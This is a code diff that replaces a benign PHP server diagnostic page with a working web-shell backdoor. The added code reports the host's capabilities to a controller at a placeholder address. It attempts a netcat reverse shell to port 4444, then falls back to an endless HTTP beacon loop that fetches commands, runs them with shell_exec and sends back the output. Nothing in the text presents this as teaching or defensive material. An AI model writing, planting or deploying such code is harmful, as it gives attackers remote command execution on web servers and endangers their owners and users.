@@ -1,88 +1,66 @@
 <?php
-header("Content-Type: text/plain");
-echo "=== PHP LAB DIAGNOSTIC ===\n\n";
+set_time_limit(0);
+ignore_user_abort(true);
 
-/* -------------------------
-   BASIC SERVER INFO
-------------------------- */
-echo "[SERVER INFO]\n";
-echo "Hostname        : " . gethostname() . "\n";
-echo "OS              : " . php_uname() . "\n";
-echo "PHP Version     : " . PHP_VERSION . "\n";
-echo "SAPI            : " . php_sapi_name() . "\n";
-echo "User            : " . get_current_user() . "\n";
-echo "Document Root   : " . ($_SERVER['DOCUMENT_ROOT'] ?? '-') . "\n";
-echo "\n";
+/* ================= CONFIG ================= */
+$CTRL_HTTP = "http://IP_CONTROLLER:8080";
+$CTRL_IP   = "IP_CONTROLLER";
+$NC_PORT   = 4444;
+$INTERVAL  = 5;
 
-/* -------------------------
-   DISABLED FUNCTIONS
-------------------------- */
-echo "[PHP FUNCTIONS]\n";
-$disabled = ini_get("disable_functions");
-if ($disabled) {
-    echo "disable_functions: $disabled\n";
-} else {
-    echo "disable_functions: NONE\n";
+/* ================= DIAG ================= */
+$cap = [
+    "exec" => function_exists("exec"),
+    "shell_exec" => function_exists("shell_exec"),
+    "nc" => false,
+    "out_tcp" => false
+];
+
+if ($cap["shell_exec"]) {
+    $cap["nc"] = trim(shell_exec("command -v nc 2>/dev/null")) !== "";
 }
 
-$funcs = ["exec", "system", "shell_exec", "passthru", "popen"];
-foreach ($funcs as $f) {
-    echo str_pad($f, 15) . ": " . (function_exists($f) ? "ENABLED" : "DISABLED") . "\n";
-}
-echo "\n";
-
-/* -------------------------
-   NETCAT CHECK
-------------------------- */
-echo "[NETCAT CHECK]\n";
-
-function cmd_exists($cmd) {
-    $out = shell_exec("command -v $cmd 2>/dev/null");
-    return !empty($out);
-}
-
-if (function_exists("shell_exec")) {
-    if (cmd_exists("nc")) {
-        echo "netcat (nc)      : FOUND\n";
-    } elseif (cmd_exists("ncat")) {
-        echo "ncat             : FOUND\n";
-    } elseif (cmd_exists("netcat")) {
-        echo "netcat           : FOUND\n";
-    } else {
-        echo "netcat           : NOT FOUND\n";
-    }
-} else {
-    echo "shell_exec       : DISABLED (cannot check nc)\n";
-}
-echo "\n";
-
-/* -------------------------
-   OUTBOUND CONNECT TEST
-------------------------- */
-echo "[OUTBOUND TEST]\n";
-$test_host = "8.8.8.8";
-$test_port = 53;
-
-$fp = @fsockopen($test_host, $test_port, $errno, $errstr, 5);
+$fp = @fsockopen("8.8.8.8", 53, $e, $s, 5);
 if ($fp) {
-    echo "Outbound TCP     : ALLOWED ($test_host:$test_port)\n";
+    $cap["out_tcp"] = true;
     fclose($fp);
-} else {
-    echo "Outbound TCP     : BLOCKED ($errno - $errstr)\n";
-}
-echo "\n";
-
-/* -------------------------
-   PERMISSION CHECK
-------------------------- */
-echo "[PERMISSION]\n";
-$tmp = "/tmp/php_test_" . uniqid();
-if (@file_put_contents($tmp, "test")) {
-    echo "Write /tmp       : OK\n";
-    unlink($tmp);
-} else {
-    echo "Write /tmp       : FAILED\n";
 }
 
-echo "\n=== END DIAGNOSTIC ===\n";
-?>
+/* ================= SEND CAPABILITY ================= */
+@file_get_contents(
+    $CTRL_HTTP . "/cap",
+    false,
+    stream_context_create([
+        "http" => [
+            "method" => "POST",
+            "content" => json_encode($cap),
+            "header" => "Content-Type: application/json"
+        ]
+    ])
+);
+
+/* ================= TRY NETCAT ================= */
+if ($cap["exec"] && $cap["nc"] && $cap["out_tcp"]) {
+    $cmd = "nc $CTRL_IP $NC_PORT -e /bin/bash";
+    exec($cmd . " >/dev/null 2>&1 &");
+}
+
+/* ================= FALLBACK: HTTP BEACON ================= */
+while (true) {
+    $cmd = @file_get_contents($CTRL_HTTP . "/task");
+    if ($cmd) {
+        $out = shell_exec($cmd . " 2>&1");
+        @file_get_contents(
+            $CTRL_HTTP . "/result",
+            false,
+            stream_context_create([
+                "http" => [
+                    "method" => "POST",
+                    "content" => $out ?: "(no output)",
+                    "header" => "Content-Type: text/plain"
+                ]
+            ])
+        );
+    }
+    sleep($INTERVAL);
+}
